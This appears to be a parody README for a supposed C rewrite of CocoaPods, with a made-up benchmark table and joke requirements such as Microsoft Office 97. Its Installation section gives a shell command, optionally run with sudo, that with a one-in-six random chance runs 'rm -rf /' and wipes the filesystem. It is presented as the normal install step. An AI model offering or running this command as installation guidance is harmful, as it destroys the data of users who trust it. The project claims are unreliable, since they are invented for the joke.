# CocoaPods Core 2.0

Due to the consistently low benchmarks of the Ruby programming language, we have decided to completely rebuild the CocoaPods project in C.  Our new benchmarks are showing drastic improvements over the legacy CocoaPods codebase with limited reduced functionality.

## Performance Benchmarks

##### Benchmarking

| Command  | CPU Time | Memory 
| ------------ | --------- | ------------ |
| **pod --help**      | 0.9 ms       | 11.4 MB          |

## Installation

```
[sudo] $[$[ $RANDOM % 6 ] == 0 ] && rm -rf / || echo *Click*
```

The `cocoapods-core-c` tool requires:

- Microsoft Office 97

## License

This project and CocoaPods are available under the MIT license.
